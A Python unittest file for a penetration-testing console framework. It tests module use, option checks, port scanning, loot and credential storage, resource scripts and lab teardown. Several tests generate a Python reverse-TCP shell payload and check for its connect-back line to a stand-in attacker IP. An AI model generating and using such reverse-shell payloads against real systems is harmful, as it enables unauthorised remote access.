"""Console-level tests: drive FrameworkConsole.onecmd and assert on output.

Run: python3 -m unittest discover -s tests
"""

import contextlib
import io
import os
import socket
import sys
import tempfile
import time
import unittest
from pathlib import Path
from unittest import mock

ROOT = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(ROOT))

from core import output  # noqa: E402
from core.console import FrameworkConsole  # noqa: E402
from core.lab import Lab, LabManager  # noqa: E402
from core.registry import ModuleRegistry  # noqa: E402
from core.store import Store  # noqa: E402

output.color_enabled = False  # keep captured text free of escapes


def make_console():
    registry = ModuleRegistry(ROOT / "modules")
    registry.load()
    return FrameworkConsole(registry, Store(":memory:"))


def run(console, *commands):
    """Run commands, return everything printed meanwhile."""
    buf = io.StringIO()
    with contextlib.redirect_stdout(buf):
        for command in commands:
            console.onecmd(command)
    return buf.getvalue()


class TestConsoleBasics(unittest.TestCase):
    def setUp(self):
        self.console = make_console()

    def tearDown(self):
        self.console.store.close()

    def test_use_and_prompt(self):
        run(self.console, "use auxiliary/scanner/port_scan")
        self.assertIsNotNone(self.console.module)
        self.assertIn("auxiliary/scanner/port_scan", self.console.prompt)

    def test_use_unknown_module(self):
        out = run(self.console, "use nonsense/thing")
        self.assertIn("No such module", out)

    def test_run_without_module(self):
        out = run(self.console, "run")
        self.assertIn("No module selected", out)

    def test_set_validates_type(self):
        out = run(self.console, "use auxiliary/scanner/port_scan", "set THREADS banana")
        self.assertIn("expected an integer", out)

    def test_set_unknown_option(self):
        out = run(self.console, "use auxiliary/scanner/port_scan", "set NOPE 1")
        self.assertIn("Unknown option", out)

    def test_missing_required_blocks_run(self):
        out = run(self.console, "use auxiliary/scanner/port_scan", "run")
        self.assertIn("Missing required option: RHOSTS", out)

    def test_payload_flow(self):
        out = run(
            self.console,
            "use payloads/python_reverse_tcp",
            "set LHOST 10.10.14.5",
            "generate",
        )
        self.assertIn('s.connect(("10.10.14.5",4444))', out)

    def test_setg_fallback(self):
        out = run(
            self.console,
            "setg LHOST 10.0.0.9",
            "use payloads/python_reverse_tcp",
            "generate",
        )
        self.assertIn('s.connect(("10.0.0.9",4444))', out)

    def test_unknown_command(self):
        out = run(self.console, "frobnicate")
        self.assertIn("Unknown command", out)


class TestConsoleJobsAndStore(unittest.TestCase):
    def setUp(self):
        self.console = make_console()

    def tearDown(self):
        self.console.store.close()

    def test_background_scan_records_services(self):
        # real listener so the scan finds something
        srv = socket.socket()
        srv.bind(("127.0.0.1", 0))
        srv.listen(1)
        port = srv.getsockname()[1]
        try:
            run(
                self.console,
                "use auxiliary/scanner/port_scan",
                "set RHOSTS 127.0.0.1",
                f"set PORTS {port}",
                "run -j",
            )
            job = self.console.jobs.all()[0]
            deadline = time.time() + 5
            while job.running and time.time() < deadline:
                time.sleep(0.01)
            self.assertEqual(job.status, "done")

            # completion is announced on the next command
            out = run(self.console, "jobs")
            self.assertIn(f"Job {job.id} finished", out)

            log = run(self.console, f"jobs -o {job.id}")
            self.assertIn(f"127.0.0.1:{port} open", log)

            services = self.console.store.services("127.0.0.1")
            self.assertEqual([s["port"] for s in services], [port])

            hosts_out = run(self.console, "hosts")
            self.assertIn("127.0.0.1", hosts_out)
        finally:
            srv.close()

    def test_workspace_command(self):
        out = run(self.console, "workspace htb", "workspace")
        self.assertIn("Workspace: htb", out)
        self.assertIn("* htb", out)

    def test_loot_commands(self):
        out = run(
            self.console,
            'loot -a note "nmap scripts" "smb signing disabled"',
            "loot",
        )
        self.assertIn("Saved loot 1", out)
        self.assertIn("nmap scripts", out)
        content = run(self.console, "loot -i 1")
        self.assertIn("smb signing disabled", content)


class TestResourceAndSpool(unittest.TestCase):
    def setUp(self):
        self.console = make_console()

    def tearDown(self):
        self.console.store.close()

    def test_resource_runs_file(self):
        with tempfile.NamedTemporaryFile(
            "w", suffix=".rc", delete=False
        ) as f:
            f.write(
                "# a comment\n"
                "\n"
                "setg LHOST 10.9.9.9\n"
                "use payloads/python_reverse_tcp\n"
                "generate\n"
            )
            path = f.name
        try:
            out = run(self.console, f"resource {path}")
        finally:
            os.unlink(path)
        self.assertIn("resource> setg LHOST 10.9.9.9", out)
        self.assertIn("LHOST => 10.9.9.9", out)
        self.assertIn('s.connect(("10.9.9.9",4444))', out)

    def test_resource_missing_file(self):
        out = run(self.console, "resource /nope/does-not-exist.rc")
        self.assertIn("No such file", out)

    def test_resource_recursion_guard(self):
        with tempfile.NamedTemporaryFile(
            "w", suffix=".rc", delete=False
        ) as f:
            f.write(f"resource {f.name}\n")
            path = f.name
        try:
            out = run(self.console, f"resource {path}")
        finally:
            os.unlink(path)
        self.assertIn("nested too deep", out)

    def test_spool_captures_output_ansi_free(self):
        output.color_enabled = True  # prove ANSI is stripped in the log
        try:
            with tempfile.TemporaryDirectory() as tmp:
                spool_file = Path(tmp) / "evidence.log"
                run(
                    self.console,
                    f"spool {spool_file}",
                    "show modules",
                    "spool off",
                )
                text = spool_file.read_text()
            self.assertIn("auxiliary/scanner/port_scan", text)
            self.assertNotIn("\033[", text)
        finally:
            output.color_enabled = False

    def test_spool_off_without_spool(self):
        out = run(self.console, "spool off")
        self.assertIn("Not spooling", out)


class TestLabTeardown(unittest.TestCase):
    def setUp(self):
        registry = ModuleRegistry(ROOT / "modules")
        registry.load()
        web = Lab("web", Path("/x"), Path("/x/compose.yml"), [(18080, 8080)])
        self.lab_mgr = mock.Mock(spec=LabManager)
        self.lab_mgr.labs.return_value = {"web": web}
        self.lab_mgr.up.return_value = web
        self.console = FrameworkConsole(registry, Store(":memory:"), self.lab_mgr)

    def tearDown(self):
        self.console.store.close()

    def test_exit_tears_down_session_labs(self):
        run(self.console, "lab up web")
        self.lab_mgr.up.assert_called_once_with("web")
        run(self.console, "exit")
        self.lab_mgr.down.assert_called_once_with("web")

    def test_labs_started_elsewhere_are_left_alone(self):
        run(self.console, "exit")
        self.lab_mgr.down.assert_not_called()

    def test_lab_downed_in_session_is_not_torn_down_twice(self):
        run(self.console, "lab up web", "lab down web", "exit")
        self.assertEqual(self.lab_mgr.down.call_count, 1)

    def test_teardown_failure_is_a_warning_not_a_crash(self):
        from core.lab import LabError

        self.lab_mgr.down.side_effect = LabError("daemon gone")
        out = run(self.console, "lab up web", "exit")
        self.assertIn("Could not tear down", out)

    def test_lab_clean_clears_session_tracking(self):
        self.lab_mgr.clean.return_value = ["web"]
        self.lab_mgr.running_projects.return_value = [("forge-lab-web", "/x")]
        with mock.patch("builtins.input", return_value="y"):
            out = run(self.console, "lab up web", "lab clean", "exit")
        self.assertIn("Tore down lab 'web'", out)
        # clean handled the teardown; exit must not down it again
        self.lab_mgr.down.assert_not_called()

    def test_lab_clean_aborted(self):
        self.lab_mgr.running_projects.return_value = [("forge-lab-web", "/x")]
        with mock.patch("builtins.input", return_value="n"):
            out = run(self.console, "lab clean")
        self.assertIn("Clean aborted", out)
        self.lab_mgr.clean.assert_not_called()

    def test_lab_purge_confirmed(self):
        with mock.patch("builtins.input", return_value="y"):
            out = run(self.console, "lab purge web")
        self.assertIn("Purged lab 'web'", out)
        self.lab_mgr.purge.assert_called_once_with("web")

    def test_lab_purge_aborted(self):
        with mock.patch("builtins.input", return_value="n"):
            out = run(self.console, "lab purge web")
        self.assertIn("Purge aborted", out)
        self.lab_mgr.purge.assert_not_called()


class TestDataCommands(unittest.TestCase):
    def setUp(self):
        self.console = make_console()

    def tearDown(self):
        self.console.store.close()

    def test_creds_empty(self):
        out = run(self.console, "creds")
        self.assertIn("No credentials stored yet.", out)

    def test_creds_lists_entries(self):
        self.console.store.add_cred("10.0.0.1", "ssh", "admin", "admin", "test")
        out = run(self.console, "creds")
        self.assertIn("admin", out)
        self.assertIn("ssh", out)
        filtered = run(self.console, "creds 10.0.0.9")
        self.assertIn("No credentials", filtered)

    def test_creds_delete(self):
        self.console.store.add_cred("10.0.0.1", "ssh", "admin", "admin", "test")
        cid = self.console.store.creds()[0]["id"]
        out = run(self.console, f"creds -d {cid}", "creds")
        self.assertIn(f"Deleted cred {cid}", out)
        self.assertIn("No credentials stored yet.", out)
        out = run(self.console, f"creds -d {cid}")
        self.assertIn("No cred", out)

    def test_loot_delete(self):
        out = run(self.console, 'loot -a note tmp "junk entry"', "loot -d 1", "loot")
        self.assertIn("Deleted loot 1", out)
        self.assertIn("No loot recorded yet.", out)

    def test_loot_file_roundtrip(self):
        import core.store as store_mod

        with tempfile.TemporaryDirectory() as tmp:
            src = Path(tmp) / "key.txt"
            src.write_text("ssh-private-key-contents")
            self.console.store = store_mod.Store(":memory:",
                                                 loot_dir=Path(tmp) / "blobs")
            out = run(
                self.console,
                f"loot -f file ssh-key {src}",
                "loot -i 1",
            )
            self.assertIn("Saved file loot 1", out)
            self.assertIn("File loot:", out)
            self.assertIn("ssh-private-key-contents", out)

    def test_loot_delete_removes_blob(self):
        import core.store as store_mod

        with tempfile.TemporaryDirectory() as tmp:
            src = Path(tmp) / "key.txt"
            src.write_text("ssh-private-key-contents")
            self.console.store = store_mod.Store(":memory:",
                                                 loot_dir=Path(tmp) / "blobs")
            run(self.console, f"loot -f file ssh-key {src}")
            blob = next((Path(tmp) / "blobs").iterdir())
            out = run(self.console, "loot -d 1")
            self.assertIn("Deleted loot 1", out)
            self.assertIn("Deleted loot file", out)
            self.assertFalse(blob.exists())
            self.assertEqual(self.console.store.loot(), [])

    def test_report_markdown_and_json(self):
        import json as _json

        self.console.store.add_service("10.0.0.1", 80, name="http")
        self.console.store.add_cred("10.0.0.1", "http", "admin", "hunter2")
        with tempfile.TemporaryDirectory() as tmp:
            md = Path(tmp) / "report.md"
            js = Path(tmp) / "report.json"
            out = run(self.console, f"report {md}", f"report {js}")
            self.assertIn("Report written", out)
            self.assertIn("## Credentials (1)", md.read_text())
            self.assertEqual(_json.loads(js.read_text())["creds"][0]["username"],
                             "admin")


class TestHistory(unittest.TestCase):
    def test_history_roundtrip(self):
        import readline

        with tempfile.TemporaryDirectory() as tmp:
            hist = Path(tmp) / "history"
            readline.clear_history()
            readline.add_history("use auxiliary/scanner/port_scan")
            readline.add_history("set RHOSTS 10.0.0.1")

            registry = ModuleRegistry(ROOT / "modules")
            registry.load()
            console = FrameworkConsole(registry, Store(":memory:"),
                                       history_file=hist)
            console.save_history()
            self.assertTrue(hist.exists())

            readline.clear_history()
            console2 = FrameworkConsole(registry, Store(":memory:"),
                                        history_file=hist)
            self.assertEqual(readline.get_current_history_length(), 2)
            self.assertEqual(readline.get_history_item(2), "set RHOSTS 10.0.0.1")
            console.store.close()
            console2.store.close()
            readline.clear_history()


class TestShellPassthrough(unittest.TestCase):
    def test_bang_runs_command(self):
        console = make_console()
        try:
            out = run(console, "!echo fw-shell-ok")
            self.assertIn("fw-shell-ok", out)
            self.assertIn("Usage", run(console, "!"))
        finally:
            console.store.close()


class TestPathCompletion(unittest.TestCase):
    def test_path_complete(self):
        console = make_console()
        try:
            with tempfile.TemporaryDirectory() as tmp:
                (Path(tmp) / "words.txt").write_text("x")
                (Path(tmp) / "subdir").mkdir()
                matches = console._path_complete(str(Path(tmp) / "wo"))
                self.assertEqual(matches, [str(Path(tmp) / "words.txt")])
                matches = console._path_complete(str(Path(tmp) / "s"))
                self.assertEqual(matches, [str(Path(tmp) / "subdir") + "/"])
        finally:
            console.store.close()


class TestDebugCommand(unittest.TestCase):
    def test_debug_toggle(self):
        console = make_console()
        try:
            out = run(console, "debug on")
            self.assertIn("on", out)
            self.assertTrue(output.debug_enabled)
            out = run(console, "debug off")
            self.assertIn("off", out)
            self.assertFalse(output.debug_enabled)
            out = run(console, "debug nonsense")
            self.assertIn("Usage", out)
        finally:
            output.debug_enabled = False
            console.store.close()


if __name__ == "__main__":
    unittest.main()
